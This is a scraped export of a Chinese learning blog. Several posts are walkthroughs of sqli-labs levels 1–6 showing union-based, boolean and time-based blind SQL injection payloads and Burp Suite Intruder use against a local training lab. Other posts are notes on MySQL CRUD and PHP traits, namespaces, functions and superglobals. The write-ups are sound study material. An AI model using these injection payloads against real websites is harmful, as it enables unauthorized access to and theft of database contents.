quotes可以知道这次需要使用双引号的注入 然后再加上时间盲注 那其他过程都和之前的一样 整理时间盲注代码： 1234 and if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(5),1) --+and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)&#x3D;&#39;e&#39;,sleep(5),1) --+and if(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1)&gt;&#39;e&#39;,sleep(5),1) --+and if(substr((select email_id from emails limit 0,1),1,1)&#x3D;&#39;D&#39;,sleep(5),1) --+ 说几个需要注意的点吧，首先 是空格一定要在英文模式下打，其次 括号要分清几个，然后比如说我们要找字段名 就是column_name 而column_name 是从表中也就是table_name里面找到的 这个要理解一下，不然一直记错很难受","categories":[],"tags":[]},{"title":"sqlilabs2","slug":"sqlilabs2","date":"2020-11-09T11:31:39.000Z","updated":"2020-11-14T12:37:22.893Z","comments":true,"path":"2020/11/09/sqlilabs2/","link":"","permalink":"http://example.com/2020/11/09/sqlilabs2/","excerpt":"sqlilabs第五关这次的和之前四关就很不一样了，虽然还是单引号的字符型注入，但是 这个you are in 就很尴尬，除了报错，不然都是you are in。。。。所以要怎么办呢这个时候就要知道什么叫盲注了","text":"sqlilabs第五关这次的和之前四关就很不一样了，虽然还是单引号的字符型注入，但是 这个you are in 就很尴尬，除了报错，不然都是you are in。。。。所以要怎么办呢这个时候就要知道什么叫盲注了 盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显 到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注 盲注有三类•基于布尔 SQL 盲注•基于时间的 SQL 盲注 •基于报错的 SQL 盲注先从布尔sql盲注说起吧 首先是sql注入截取字符串常用函数首先是mid（）函数此函数为截取字符串的一部分语法：MID（column_name,start,[length]） eg： str=”123456” mid(str,2,1) 结果为2 例子： （1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 （2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 substr()函数 Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length)string substr(string, start, length)参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。例子：(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入 Left()函数 Left()得到字符串左部指定个数的字符 Left ( string, n ) string为要截取的字符串，n为长度。 Sql用例： (1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。 (2) 同样的string可以为自行构造的sql语句。 同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’资料来源：https://www.cnblogs.com/lcamry/p/5504374.html length()函数可以用来判断字符数eg：length(database())&gt;5,这个数据库的名称是否大于五个字符资料先放着吧，感觉还是要运用了记忆力会比较深然后回到题目来：此时我们使用length判断数据库名称的长短使用指令and length(database())&gt;=8 画面返回 但是当我 为and length (database())&gt;9的时候 返回了这玩意，说明是错的，也就是这个数据库的字符数是8，想一下我就觉得是security。我们接下来去试试 方法一这里有一种方法是利用 substr(database(),1,1)=’s’ 这个函数来一个个试 发现是可以的，说明第一个字母就是s，然后接下来继续去试，发现就是security 方法2这里有一种方法是利用burp suite工具：下面是学习过程 proxy 和代理相关 intercept截断默认Intercept is on 按钮出于开启状态 也就是说默认代理截断功能是打开的.此时所有的请求都会被截断,只有手动Forward之后请求才会被发出去 Http history(http请求历史)所有经过burp suite 的请求 都会被记录到http history中. 上面是请求概要信息 下面是请求详细信息 websookets history有的web时没有界面的，是用一个长链接 类似于api的方式来传输数据 burp suite也是可以截获这类信息的api是一个通道，是一个接口，负责一个程序和其他软件的沟通，本质是预先定义的函数，就是类似于预设。 options（配置选项）Proxy Listeners(侦听端口设置) 点击next 就会生成一张证书 选择路径保存. 然后导入到浏览器,就可以实现https的访问 资料来自：https://www.cnblogs.com/php09/p/10412687.html 学习博客：https://blog.csdn.net/qq_35544379/article/details/76696106 弄这个弄得我想吐，我在抓sqlilabs的本地包的时候，一直抓不到 ，我以为是burp的问题，原来是浏览器的问题，人傻了，我试了几个方法，好像修改火狐浏览器的一个高级选项是最有效的，这样你使用localhost输入的时候也可以抓到了 我发现一件事，我再用 1?id&#x3D;1&#39;and substr(database(),1,1)&#x3D;&#39;s&#39; --+ 这个语句的时候，我就在想，我首先知道这个数据库的名称有多长，然后对每个字母单独加一个burp里面的变量符，这样，我是不是就免去了一个个去试的麻烦呢？接下来验证一下根据前面我的做题，我们知道，这个数据库名字的长度肯定是8个字符 首先是这样 然后 先clear 再分别对每个a进行add 我发现这个方法是不行的，但是我的思路是OK的，因为我发现他有另外一个功能，我接下来直接放图就一目了然了 就这样，然后点击star attack就可以，但是我发现这个add from list中选择8个字母好像没有所有排序，所以。。。。。可能还有更好地方法？，那反正这一步大概就是这样了接下来是判断他的库名：库名其实还是要使用substr来判断他的库名 其实就是在前三关查询的基础上 加了一个substr 语句是这样的 1&#39; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1 ),1,1) &#x3D; &#39;e&#39; --+ &#x2F;&#x2F;这边有一点需要说明的是为什么需要加这个limit 0,1 我们知道一个库中可以有很多表，按我的理解是，你如果没有加这个limit0,1 那么数据库以为你要查询的数据数每个表的，也就是说这个语句变成，每个表的第一个字母是e，而不是我们想要的，第一个表的首字母为e。 这边补充一下limit n,m的功能和意思limit的使用格式为limit m,n，其中m是指记录开始的位置，从0开始，表示第一条记录，n是指取n条记录例如：limit 0,1 表示从第一条记录开始，取一条记录，在上面那个语句中的意思就是，从第一个表开始取，去一个表的名称 localhost:81/sqli-labs-php7-master/Less-5/?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’ –+然后根据之前的经验就是emails 其实也没啥太大区别，后续就是替换substr当中的语句，替换为select column_name from information_schema.columns where table_name =’emails’ 还有什么一个字符的就不多说了。其实不一定要用substr 还有其他很多命令，我在下面的关卡看看能不能使用，不能使用的话，后续再整理 第六关确实和之前一样，但是这边是双引号的报错解题思路和上一次一样，这次我们换换其他指令看看效果：我去查了一下 报错函数是否都需要加and 我是没找到具体说明，但我看每个在使用的时候都有加一个and的接下来我们先用left其实和substr也差不多，不过 left是规定从左边起，而substr还能规定从哪里开始从哪里结束记代码一样打一下","categories":[],"tags":[]},{"title":"sqlilabs1","slug":"sqlilabs1","date":"2020-11-07T15:53:55.000Z","updated":"2020-11-09T11:30:24.144Z","comments":true,"path":"2020/11/07/sqlilabs1/","link":"","permalink":"http://example.com/2020/11/07/sqlilabs1/","excerpt":"在第二关中 我首先用and 1=1 和and1=2 得到的结果是不一致，说明我们的语句可以被注入使用,也即存在注入点： 接下来我们就要利用这个注入点输入语句了 这个是我们加个‘发现是和上一题是不一样的","text":"在第二关中 我首先用and 1=1 和and1=2 得到的结果是不一致，说明我们的语句可以被注入使用,也即存在注入点： 接下来我们就要利用这个注入点输入语句了 这个是我们加个‘发现是和上一题是不一样的 输入单引号，根据报错信息确定咱们输入的内容被原封不动的带入到数据库中，也可叫做数字型注入， 这个时候我们发现第二关相比第一关少了一个单引号，所以我们这题我们就无须加单引号，直接写查询代码就可以了（看看我们上面执行的and其实也就可以知道了） 这个时候我们还是用order by 查询他的字段数，可以发现，依旧为3；然后我们使用union联合select 在这里发现一个神奇的事情，是不是用–+注释掉后面都可以，没啥区别 这边有一点我需要再明确的：我们是先获得数据库database()的名字，在通过数据库的名字后查询表名table_name，再知道表名之后，查询字段名column_name后面和前面的第一关是很类似的，就不详细说 接下来是第三关当我输入and 1=1 或者是 and1=2的时候，页面没有任何区别，所以这个和第二关不太一样，此时我们再尝试一下输入单引号 页面变成如下 从错误报告中我们可以知道 12use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;&#39;) LIMIT 0,1 这个时候我们发现 在输入单引号后，后面多了一个括号， 我们把use的那条补充完整，应该是use near ‘(‘1’’) LIMIT 0,1’ at line 1这个时候我们可以推测出这次的程序如果要执行代码应该是要（’执行内容’），所以我们尝试一下在’后面加一个括号，让整个语句变成use near ‘(‘1’)’ ‘) limit’ **让我尝试一下 发现他是变成这样的：use near ‘’) LIMIT 0,1’ at line 1 就像我在第一关说的，（’1’） 因为已经是合法数据，所以就没出现了，符合我的猜想，我一开始说要执行代码需要（’内容’）这个格式，所以我接下来便输入了：?id=1’)(‘and1=1’) 并且无论是否加 –+ 都是错误的，所以我就纳闷啊，为啥呢，后来发现是要（’’）这个形式没错但是，我们将语句还原回去一下use near ‘(‘(‘1’)and1=1’)’** 此时我们就可以发现其实and1=1 是（’’）这个形式了在后面加上注释符，即可 此时我们发现，存在注入点，接下来就和前两题应该没什么区别了吧让我尝试一波此时有点小无语，因为没有让前面的id为假，导致我一直输出dumb，我还在想哪里出错了，无语了和之前的没啥区别，就不说了哈哈哈哈补充一下就是 一开始的group_concat(column_name) 这边这个table或者column是不用加s的，需要加的是information_schema.columns这边需要加，这一整个语句中就是这里需要加。好像也没啥要写的，如果有的话再来补充吧 第四关这个前四关都一模一样啊，我本来想第四关重新写一篇博客水一下，可是一看到题目就知道跟前三篇几乎一模一样吧？唯一不同的是这次是双引号” 确实一模一样，没啥好说的","categories":[],"tags":[]},{"title":"sqli-labs小试","slug":"sqli-labs小试","date":"2020-10-24T07:14:35.000Z","updated":"2020-11-30T16:12:26.458Z","comments":true,"path":"2020/10/24/sqli-labs小试/","link":"","permalink":"http://example.com/2020/10/24/sqli-labs%E5%B0%8F%E8%AF%95/","excerpt":"这个是第二次写这篇博客，我没想到居然忘记保存了，泪目。。 sql注入首先我觉得可能要先理解一下什么是sql注入sql注入 指的是，web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序事先定义好的查询语句的结尾添加额外的SQL语句，在管理员不知情的情况下事先非法操作，以此实现欺骗数据库服务器执行非授权的命令。 sql注入的类型1.字符型注入2.数字型注入","text":"这个是第二次写这篇博客，我没想到居然忘记保存了，泪目。。 sql注入首先我觉得可能要先理解一下什么是sql注入sql注入 指的是，web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序事先定义好的查询语句的结尾添加额外的SQL语句，在管理员不知情的情况下事先非法操作，以此实现欺骗数据库服务器执行非授权的命令。 sql注入的类型1.字符型注入2.数字型注入 这是一个写到第三关的补充我在想为什么加入一个单引号或者‘）就可以实现注入，就可以进行操作，在思考一番过后，我发现是这样的：就拿第一关来说吧 当我输入的是?id=1’的时候，看这个错误代码： 12 use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1&#x2F;&#x2F;这个是我在文件里面加入的提示sql执行的语句 当我输入and1=1后 可以发现他的错误提示是 12 use near &#39;and1&#x3D;1&#39; LIMIT 0,1&#39; at line 1SELECT * FROM users WHERE id&#x3D;&#39;1&#39;and1&#x3D;1&#39; LIMIT 0,1 这里是来自第23关的一个更正1所以就又重新思考了一下，加上资料查找：闭合指的是双引号成对存在，所以我们看上面的语句 当我们加入了一个引号的时候，此时的引号一共是有五个的，所以必然存在一个多余的单引号，那么我们需要去掉哪个引号才不会影响我们的语句呢？ **2.**注释符 会将后面所有内容给注释掉 ,,,所以在这个语句中’’2’and1=1’ LIMIT 0,1’，我们先解析一下， 首尾各有一个引号，切2前面和1后面各有一个引号，这个是’$id’ 在源码中出现的两个引号，而首尾的引号是后来出现的，我们在2后多加了一个单引号后，导致引号之间不配对了，所以出现错误，这个时候我们需要将1后面的单引号，limit，这样2前面的单引号就和我们的插入的但引号配对成功了那么当然也有不注释的方法：就是让所有的引号都找到自己的另一半，也就是说我们在这里多加一个单引号就可以了**1.**这边有几个问题需要说一下，引号内的数据要合法，要保证连贯性，他前后是可以互相拼接的比如’=1’就不行，还有就是引号的闭合好像是有就近原则，我刚才试了一下 发现 ‘1’and 1=1’’这个就不行，可能是因为 最后两个引号直接无数据导致出错了，然后两个引号之间闭合，引号的内容会变成字符段，所以这个时候我们就无法使用order by 来查询字符段数目。因为order by需要的是数字，这个时候我们直接使用 union select尝试即可。 less11.根据这个题目中的get-error based-single quotes，我们就可以知道这题是单引号引起的字符型输入，所以我们直接输入?id=1。2.接下来我们输入一个单引号’3.可以发现，网页开始报错了内容是 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1SELECT * FROM users WHERE id=’1’’ LIMIT 0,1 在这个当中单引号被包括进去了，但是却报错了，而当我尝试其他符号的时候，发现是可以正常显示的。接着我们用and 1=1 和and1=2来测试， 这里补充一个知识点， and 1=1代表永恒为真， and 1=2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点! 接下来我们需要知道查询表的字段数，我们才能利用union+select查询我们所需要的信息因为 select （），（），（）， 有几个括号是要和该表的字段数所对应，在这里我们需要引入一个order by命令在这里 order by 的作用是用来查询字段数，当你order by （一个数字）的时候，如果有这么多字段数，那么输出结果就不会报错，如果没有，就会报错而我们通常会将order by 结合二分法这个时候就可以很快的查询到字段数（核心是猜） 知道字段数吼，并且知道我们就可以利用注入点，添加一些命令语句，获得我们想要的信息。 然后这里需要了解一个union命令 ： 两个要联合的SQL语句 字段个数必须一样，而且字段类型要一致 这个union命令可以拼接语句，使得将两个select语句联合起来使用，这个时候我们可以让前面那个select为假使用不了，这样后面的语句就可以使用了。 这个时候使用 ?id=1’ and 0 union select 1,2,3 –+ 就可以发现页面变成 这个样子，说明字段2代表的是登录名一栏，字段3代表的是密码一栏 接下来，我们要做的就是让可以显示的这几栏我们想要的信息： 当我们输入select 1,database (),3 –+的时候 我们就可以得知其中数据库的名字，为security 紧接着，我们就可以再利用select 查询这个库名里面的表名接下来我们在union后面添加 select 1,group_concat(table_name),3 from information _schema.tables where table_schema =’security’ –+ 那这个时候 就出现了这个数据库中的所有表名， 接下来我们知道了库名，知道了表名，就可以去找表中的字段名了差找字段名的语句是这样的 select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’emails’–+也可以直接是 select 1,group_concat(column_name),3 from information_schema.columns where table_name=’emails’–+ 根据这段语句，我们就可以获得emalis这个表中的字段名 含有一个id 一个email_id 这个时候我们就爆一下字段名 这个时候我们使用 select 1,email_id,3 from emails –+ 就可以知道这个字段名下的数据 这样就大功告成了 这个时候补充一些知识：mysql5.0版本之后 会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums 在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name; group_concat（）函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 在我们这题中我们是用group_concat(column_name)意思是将这个表中所有字段名连接起来并返回数据。https://www.cnblogs.com/wang-yaz/p/10862627.html这个是参考链接","categories":[],"tags":[]},{"title":"mysql增删改查","slug":"mysql增删改查","date":"2020-10-20T08:18:33.000Z","updated":"2020-11-06T14:07:06.407Z","comments":true,"path":"2020/10/20/mysql增删改查/","link":"","permalink":"http://example.com/2020/10/20/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/","excerpt":"创建数据库创建数据库的方法有1.create database （数据库名）；2.用mysqladmin 创建数据库: mysqladmin -u root -p create (数据库名)3利用PHP脚本创建数据库","text":"创建数据库创建数据库的方法有1.create database （数据库名）；2.用mysqladmin 创建数据库: mysqladmin -u root -p create (数据库名)3利用PHP脚本创建数据库 删除数据库1.drop database （数据库名字）； 选择数据库1.利用 use（数据库名字） 修改数据库1.修改数据库的输入数据类型格式：alter table （表名） modify （要修改的内容）2.增添数据库中的一个输入项格式：alter table （表名）add （要增加的内容）3.更改原本的数据库项目名字格式： alter table （表名）change column（要修改的） （修改结果）（数据类型）4.修改表名格式：alter table （原本表名） rename （现在想要的表名）这两个都是属于结构设计范畴的。 mysql的增删改查首先是它们的语句命令 增:insert删:delete改：update查:SELECT或者show格式向所有字段插入：insert into 表名（字段1，字段2，字段3……）values(值1,值2，值3……)；向指定字段插入:insert into 表名（指定字段集合） valuse（指定字段值）; 实例 123create table test(id int, name varchar(40),sex varchar(4),birthday date);&#x2F;&#x2F;新建一个表insert into test(id,name,sex,birthday)&#x2F;&#x2F;增加数据（插入数据）values(1，&#39;zhangsan&#39;，&#39;male&#39;,&#39;2001-08-06&#39;); 12update test set sex&#x3D;female;&#x2F;&#x2F;所有员工性别更改为女性update test set sex &#x3D; female where name &#x3D;&#39;zhangsan&#39;;&#x2F;&#x2F;更改张三这个员工的性别 这边说一下where这个函数的意思：where可以指定你想更换的数据行。删除表数据举例子吧： 123delete from test where name&#x3D;&#39;zhangsan&#39;;&#x2F;&#x2F;删除表中张三的记录delete from test;&#x2F;&#x2F;删除表中所有的记录truncate table test;&#x2F;&#x2F;使用truncate删除表中记录 查询表数据 格式：select *或者【字段名】 from 表名；查询所有字段和部分字段。 1234567select id,name,sex,birthday from test;&#x2F;&#x2F;从表中获取全部数据select name, birthday from test;&#x2F;&#x2F;从表中获取姓名和生日的信息select birthday from test where sex&#x3D;male；&#x2F;&#x2F;获取性别为男性的生日select 数字，数字，数字，数字........;&#x2F;&#x2F;可以查询指定字段的数据select 要查询的字段名 from 库名.表名；select 要查询的字段名 from 库名.表名 where 已知条件的字段名&#x3D;&#39;已知条件的值&#39;；select 要查询的字段名 from 库名.表名 where 已知条件1的字段名&#x3D;&#39;已知条件1的值&#39; and 已知条件2的字段名&#x3D;&#39;已知条件2的值&#39; 使用distinct去除重复数据select distinct 字段名 from 表名；使用limit指定查询结果的行数select 字段名 from drom 表名 limit n；实例select *from stu limit 1; 使用order by 对结果进行排序order by 字段名 ASC/DESC 修改表数据语法：update 表名 set 字段1=值，字段2=值 ；插入数据insert","categories":[],"tags":[{"name":"MYSQL","slug":"MYSQL","permalink":"http://example.com/tags/MYSQL/"}]},{"title":"PHP魔术常量以及命名空间","slug":"PHP魔术常量以及命名空间","date":"2020-10-18T08:51:38.000Z","updated":"2020-10-20T07:23:28.175Z","comments":true,"path":"2020/10/18/PHP魔术常量以及命名空间/","link":"","permalink":"http://example.com/2020/10/18/PHP%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/","excerpt":"PHP魔术常量-trait其他魔术常量都比较简单，就不具体展开了主要说说trait1.trait的功能和class的功能是很接近的，都可以定义一个类，并赋予方法2.但是如果你要让这个类被中的方法被继承使用，那么就需要使用trait举个例子","text":"PHP魔术常量-trait其他魔术常量都比较简单，就不具体展开了主要说说trait1.trait的功能和class的功能是很接近的，都可以定义一个类，并赋予方法2.但是如果你要让这个类被中的方法被继承使用，那么就需要使用trait举个例子 12345678910111213141516171819202122&lt;?phpclass cup&#123; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;class wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; //此时你如果想要这个tools同时拥有碗和杯子的功能就不可以了。&#125;?&gt; 但是当你把前两个class换成trait时，就可以执行这个功能 123456789101112131415161718192021222324&lt;?phptrait cup&#123; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格?&gt; 这边再理解一下trait嵌套trait： 123456789101112131415161718192021222324252627282930313233&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();?&gt; 如何同时使用多个trait 12345678910111213141516171819202122232425262728293031323334&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,wan;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();$makecup -&gt; food();?&gt; 如何避免同名方法？ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125; function food() &#123; echo&quot;我可以装一点点食物&quot;; &#125;&#125;trait wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,wan &#123; cup::food insteadof wan; &#125;&#125;$makecup = new tools();//$makecup -&gt; water();//-和&gt;之间不可以有空格//$makecup -&gt; demo();$makecup -&gt; food();?&gt; 输出结果是我可以装一点点食物或者可以更改名字来使用原本同名的方法 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125; function food() &#123; echo&quot;我可以装一点点食物&quot;; &#125;&#125;trait wan&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,wan &#123; cup::food insteadof wan; wan::food as wafood; &#125;&#125;$makecup = new tools();//$makecup -&gt; water();//-和&gt;之间不可以有空格//$makecup -&gt; demo();$makecup -&gt; food();?&gt; 主要就是这些了 接下来是命名空间 namespace可以将命名空间理解为一个文件夹，所以不同文件夹就可以有相同类名。 然后第一个命名空间前不可以有任何代码例： 12345678&lt;?php$a=123;namespace hello;class test&#123;&#125;?&gt; 对于命名空间，我们把其理解为一个文件夹，那么这个文件夹 何时终止呢，我运行代码所用的函数来自哪个文件夹呢？ 12345678910111213141516171819202122&lt;?phpnamespace hello;class test&#123; function train()&#123; echo&#x27;这是一个大测试&#x27;; &#125;&#125;namespace world;class test&#123; function train()&#123; echo&#x27;这是一个小测试&#x27;; &#125;&#125;$a = new test();//此时这个test依旧是属于下方的这个namespace$a -&gt; train; //这个输出的值为 这是一个小测试 那如果想要使用的namespace空间的类和方法则需要&lt;?php 123456789101112131415161718namespace hello;class test&#123; function train()&#123; echo&#x27;这是一个大测试&#x27;; &#125;&#125;namespace world;class test&#123; function train()&#123; echo&#x27;这是一个小测试&#x27;; &#125;&#125;$b = new \\hello\\test();//赋予b这个test类所具有的属性方法$b -&gt; train(); 还可以引入一个子空间的概念,如下面例子，意思就是world文件夹里面的TEST文件夹 123456789namespace world\\TEST\\;//多加一个TEST，则引入了一个子文件夹的概念意味着，你后面可以命名world\\TEST1class test&#123; function train()&#123; echo&#x27;这是一个小测试&#x27;; &#125;&#125;$b = new \\world\\TEST\\test();//赋予b这个test类所具有的属性方法$b -&gt; train(); use和as的使用直接举例子吧，比较容易理解 12345&lt;?phpinclude &#x27;你的php文件名（假设是存放有namespace的文件）&#x27;;//include可以导入文件use world\\TEST\\test；$a= new test();$a -&gt; train(); 这个时候使用的就是world空间里面的train，但是如果我同时用了两个use呢 1234567&lt;?phpinclude &#x27;你的php文件名（假设是存放有namespace的文件）&#x27;;//include可以导入文件，后面要有单引号use world\\TEST\\test；use hello\\test；//这个时候有两个test，$a所要执行的test又无法分清了，所以要**改名字**$a= new test();$a -&gt; train();?&gt; 改为如下 1234567&lt;?phpinclude &#x27;你的php文件名（假设是存放有namespace的文件）&#x27;;//include可以导入文件，后面要有单引号use world\\TEST\\test as test1 ；use hello\\test as test2；// 这个时候已经用as更换名字了，那么接下来的运行就可以分清楚了$a= new test1();$a -&gt; train();?&gt; 如果不想更改类名，那么就需要把方法所属的空间以及类都写下来以示区别。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"PHP函数","slug":"PHP函数","date":"2020-10-14T11:26:20.000Z","updated":"2020-10-20T08:01:50.977Z","comments":true,"path":"2020/10/14/PHP函数/","link":"","permalink":"http://example.com/2020/10/14/PHP%E5%87%BD%E6%95%B0/","excerpt":"PHP函数php函数的准则1.函数的名称应该提示出它的功能2.函数名称以字母或下划线开头这边先介绍一个function自定义函数格式是","text":"PHP函数php函数的准则1.函数的名称应该提示出它的功能2.函数名称以字母或下划线开头这边先介绍一个function自定义函数格式是 1234function a()//a你想定义的函数的名称&#123; 该程序所要执行的指令；&#125; 举个例子 举个例子 123456789&lt;?phpfunction writeName()&#123; echo &quot;Kai Jim Refsnes&quot;;&#125;echo &quot;My name is &quot;;writeName();?&gt; 这个function函数还可以给函数设置一个变量格式是 123456function a($b)//b是你想要改变的那个变量名&#123; 你要执行的指令$b;&#125;a(你想要改变的值); 举个例子 1234567&lt;?phpfunction a($b)&#123; echo&quot;我心里的数字是&quot;.$b;//echo和$b中间的连接是个.&#125;echo a(3);?&gt; 12输出结果：我心里的数字是3 PHP返回值的问题首先要理解什么是返回值，什么时候需要用返回值返回值，就是你运用一个函数，函数结束后，有一个结果，如果你需要那个结果，你就需要返回值举个例子 比如3+5=？，在程序当中我们需要这个答案的结果，就需要返回值 举个例子 123456789&lt;?phpfunction add($x,$y)&#123; $total=$x+$y; return $total;&#125;echo &quot;1 + 16 = &quot; . add(1,16);?&gt; 然后其他函数，遇到了再来补充","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"PHP超级全局变量以及两个循环","slug":"PHP超级全局变量以及两个循环","date":"2020-10-12T15:50:03.000Z","updated":"2020-11-14T12:05:03.148Z","comments":true,"path":"2020/10/12/PHP超级全局变量以及两个循环/","link":"","permalink":"http://example.com/2020/10/12/PHP%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E4%B8%A4%E4%B8%AA%E5%BE%AA%E7%8E%AF/","excerpt":"首先是PHP的超级全局变量首先是超级全局变量的定义:意味着它们在一个脚本的全部作用于中都可用，不需要特别说明，就可以在函数及类中使用。 第一个是$GLOBALS这个其实在之前有介绍过了，不过这次的格式可能比较不一样直接拿例子了： 123456789101112&lt;?php $x = 75; $y = 25;function addition() &#123; $GLOBALS[&#x27;z&#x27;] = $GLOBALS[&#x27;x&#x27;] + $GLOBALS[&#x27;y&#x27;]; &#125;addition(); echo $z; ?&gt; 输出结果是 100第二个是$_SERVER这是一个包含了很多信息的数组，这个数组中的项目由web服务器创建。","text":"首先是PHP的超级全局变量首先是超级全局变量的定义:意味着它们在一个脚本的全部作用于中都可用，不需要特别说明，就可以在函数及类中使用。 第一个是$GLOBALS这个其实在之前有介绍过了，不过这次的格式可能比较不一样直接拿例子了： 123456789101112&lt;?php $x = 75; $y = 25;function addition() &#123; $GLOBALS[&#x27;z&#x27;] = $GLOBALS[&#x27;x&#x27;] + $GLOBALS[&#x27;y&#x27;]; &#125;addition(); echo $z; ?&gt; 输出结果是 100第二个是$_SERVER这是一个包含了很多信息的数组，这个数组中的项目由web服务器创建。 https://www.runoob.com/php/php-superglobals.html在这个链接中，包含了$_SERVER变量中的重要元素 下面整理了几个个人感觉常用命令*$_SERVER[‘REMOTE_ADDR’] //当前用户 IP****$_SERVER[‘SERVER_ADDR’]//当前运行脚本所在的服务器的IP地址**$_SERVER[‘SERVER_PROTOCOL’]//请求页面页面时的通信协议的名称和版本$_SERVER[‘REQUEST_METHOD’]// 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”这边去看了一下这些指令的区别：首先是get和post get是从服务器上获取数据，post是向服务器传送数据。 get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。 get安全性非常低，post安全性较高。 还有一个更详细 https://www.zhihu.com/question/28586791/answer/767316172等以后遇到需要更深入了解时，再去回顾。**&amp;SERVER[‘HTTPS’]:如果脚本是通过HTTPS协议被访问，则被设为一个非空的值**&amp;_SERVER[‘REMOTE_HOST’]:浏览当前页面的用户的主机名，DNS反向解析不依懒于用户的REMOTE_ADDR&amp;_SERVER[‘REMOTE_PORT’]:用户机器上连接到WEB服务器所使用的端口号&amp;_SERVER[‘SCRIPT_URI’]:URI用来指定要访问的页面**&amp;_SERVER[‘PHP_SELF’]:**当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 